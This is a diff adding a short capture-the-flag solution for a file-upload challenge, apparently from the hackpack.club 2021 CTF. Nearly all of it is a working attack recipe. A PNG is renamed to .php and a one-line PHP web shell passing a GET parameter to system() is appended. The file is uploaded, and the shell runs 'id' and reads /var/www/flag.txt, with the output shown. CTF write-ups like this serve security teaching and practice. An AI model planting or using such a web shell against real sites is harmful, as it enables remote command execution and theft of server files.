@@ -1,0 +1,11 @@
+cp test.png test.php
+
+echo "<?php system(\$_GET['c']); ?>" >> test.php
+
+Upload test.php
+
+https://indead-upload-avatar.ctf2021.hackpack.club/very_long_directory_path/test.php?c=id
+	uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+https://indead-upload-avatar.ctf2021.hackpack.club/very_long_directory_path/test.php?c=cat%20/var/www/flag.txt
+	flag{y3t_an0ther_file_uplo@d_vuln}
